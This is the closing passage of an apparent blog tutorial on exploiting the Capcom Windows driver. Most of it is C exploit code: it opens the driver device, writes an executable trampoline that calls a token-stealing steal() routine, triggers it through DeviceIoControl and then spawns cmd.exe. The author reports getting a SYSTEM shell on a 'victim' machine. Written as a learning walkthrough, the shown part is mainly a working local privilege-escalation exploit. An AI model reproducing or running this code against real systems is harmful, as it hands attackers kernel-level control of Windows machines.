        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Device open failed: %d\n", GetLastError()); return 1;
    }
    printf("[+] Device opened\n");

    BYTE t[] = { 0,0,0,0,0,0,0,0,         //  Capcom jumps here : b+8
                 0xE8,8,0,0,0,             // CALL +8
                 0,0,0,0,0,0,0,0,          // steal() 
                 0x58,0xFF,0x20 };         // POP RAX; JMP [RAX]

    PBYTE buffer = VirtualAlloc(NULL, 24, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!buffer) { printf("[-] VirtualAlloc failed: %d\n", GetLastError()); return 1; }

    memcpy(buffer, t, 24);                              // copy trampoline bytes
    *(uint64_t*)(buffer + 0x00) = (uint64_t)(buffer + 8);// [0x00] b+8
    *(uint64_t*)(buffer + 0x0D) = (uint64_t)steal;     // [0x0D] = 13 steal()

    printf("[+] Trampoline at  : %p\n", buffer);
    printf("[+] steal() at     : %p\n", steal);

    uint64_t point = (uint64_t)(buffer + 8);
    DWORD out = 0, br = 0;
    BOOL result = DeviceIoControl(hDevice, IOCTL, &point, 8, &out, 4, &br, NULL);
    if (!result) { printf("[-] IOCTL failed: %d\n", GetLastError()); return 1; }
    printf("[+] IOCTL succeeded — token stolen\n");

    system("cmd.exe");
}
```

using my compiler `cl start.c` and transfering it to my victim, we spawn a system shell :

<img width="518" height="320" alt="image" src="https://github.com/user-attachments/assets/1b267ddd-881f-4e54-a405-b392bac5df2b" />

W00t! W00t!

Hopefully you found this blog helpful, If you find any issues understanding stuff, considering DMing me.

Until next time!
